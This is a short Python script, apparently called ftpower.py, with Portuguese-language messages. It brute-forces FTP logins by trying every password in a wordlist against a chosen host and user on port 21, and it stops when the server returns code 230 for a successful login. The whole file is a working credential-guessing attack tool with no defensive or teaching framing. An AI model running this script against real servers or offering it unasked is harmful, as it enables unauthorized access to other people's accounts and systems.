#!/usr/bin/python

import sys, socket, re

if len(sys.argv) != 4:
	print ("Modo de uso: ftpower.py host user wordlist")
	sys.exit()

host = sys.argv[1]
user = sys.argv[2]
wordlistPath = sys.argv[3]

wordlist = open(wordlistPath)

for word in wordlist:
	print ("Autenticando...{}:{}".format(user,word))

	connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connection.connect((host, 21))
	connection.recv(1024)

	userMessage = "USER {}\r\n".format(user)

	connection.send(userMessage.encode())
	connection.recv(1024)

	passwordMessage = "PASS {}\r\n".format(word)

	connection.send(passwordMessage.encode())
	response = connection.recv(1024).decode("UTF-8")

	quitMessage = "QUIT\r\n"

	connection.send(quitMessage.encode())

	connection.close()

	if re.search("230", response):
		print ("[+] ACESSO AUTORIZADO [+]")
		break
